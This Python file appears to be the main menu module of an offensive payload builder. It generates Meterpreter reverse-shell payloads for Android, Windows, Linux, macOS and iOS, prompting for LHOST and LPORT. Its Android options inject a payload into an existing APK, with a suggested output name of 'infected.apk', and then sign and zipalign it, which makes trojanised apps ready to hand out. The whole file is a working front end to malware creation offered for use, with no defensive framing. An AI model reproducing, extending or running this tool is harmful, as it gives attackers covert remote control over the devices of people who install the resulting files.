# Developer: Sreeraj
# GitHub: https://github.com/s-r-e-e-r-a-j

from .banner import show
from .utils import ask, info, warn, fail, validate_ip, validate_port, clear
from .deps import check_required, check_android_tools, auto_install
from .payload import generate, android_sign
import time


def main_loop() -> None:
    clear()
    show()
    auto = False
    if ask('Enable automatic install of missing packages? (y/N): ').strip().lower() == 'y':
        auto = True
    basic = check_required()
    android = check_android_tools()
    missing = [k for k, v in {**basic, **android}.items() if not v]
    if missing:
        ok, installed = auto_install(missing, auto=auto)
        if not ok:
            warn('Some tools still missing; Android flows may fail')
        else:
             clear()
             show()
    else:
         clear()
         show()
    while True:
        print('')
        print('[1] Android -> Normal APK')
        print('[2] Android -> Inject into original APK')
        print('[3] Windows payload')
        print('[4] Linux payload')
        print('[5] macOS payload')
        print('[6] iOS payload')
        print('[7] Re-check dependencies')
        print('[8] Exit')
        sel = ask('Select: ').strip()
        if sel == '1':
            android_normal()
        elif sel == '2':
            android_inject()
        elif sel == '3':
            simple_flow('windows_tcp')
        elif sel == '4':
            simple_flow('linux_tcp')
        elif sel == '5':
            simple_flow('macos_tcp')
        elif sel == '6':
            simple_flow('ios_tcp')
        elif sel == '7':
            basic = check_required()
            android = check_android_tools()
        elif sel == '8':
            info('Exiting')
            time.sleep(0.3)
            break
        else:
            warn('Invalid option')


def pick_android_payload() -> str:
    print('[1] android/meterpreter/reverse_tcp')
    print('[2] android/meterpreter/reverse_http')
    print('[3] android/meterpreter/reverse_https')
    p = ask('Choose: ').strip()
    if p == '2':
        return 'android_http'
    if p == '3':
        return 'android_https'
    return 'android_tcp'


def android_normal() -> None:
    clear()
    show()
    key = pick_android_payload()
    lhost = ask('LHOST: ').strip()
    if not validate_ip(lhost):
        fail('Invalid IP')
        return
    lport = ask('LPORT: ').strip()
    if not validate_port(lport):
        fail('Invalid port')
        return
    out = ask('Output apk (example: /path/to/payloadname.apk): ').strip()
    dry = ask('Dry run? (y/N): ').strip().lower() == 'y'
    ok = generate(key, lhost, int(lport), out, dry=dry)
    if ok and not dry:
        if ask('Sign & zipalign? (y/N): ').strip().lower() == 'y':
            final = ask('Final name (/path/to/final.apk): ').strip()
            android_sign(out, final)


def android_inject() -> None:
    clear()
    show()
    key = pick_android_payload()
    lhost = ask('LHOST: ').strip()
    if not validate_ip(lhost):
        fail('Invalid IP')
        return
    lport = ask('LPORT: ').strip()
    if not validate_port(lport):
        fail('Invalid port')
        return
    org = ask('Path to original APK: ').strip()
    out = ask('Output apk (example: /path/to/infected.apk): ').strip()
    dry = ask('Dry run? (y/N): ').strip().lower() == 'y'
    ok = generate(key, lhost, int(lport), out, infile=org, dry=dry)
    if ok and not dry:
        if ask('Sign & zipalign? (y/N): ').strip().lower() == 'y':
            final = ask('Final name (/path/to/final.apk): ').strip()
            android_sign(out, final)


def simple_flow(kind: str) -> None:
    clear()
    show()
    lhost = ask('LHOST: ').strip()
    if not validate_ip(lhost):
        fail('Invalid IP')
        return
    lport = ask('LPORT: ').strip()
    if not validate_port(lport):
        fail('Invalid port')
        return
    out = ask('Output filename [example:/path/to/payloadname.extension] (Extensions:- linux:.elf, windows:.exe, macOS/iOS:.macho): ').strip()
    dry = ask('Dry run? (y/N): ').strip().lower() == 'y'
    generate(kind, lhost, int(lport), out, dry=dry)
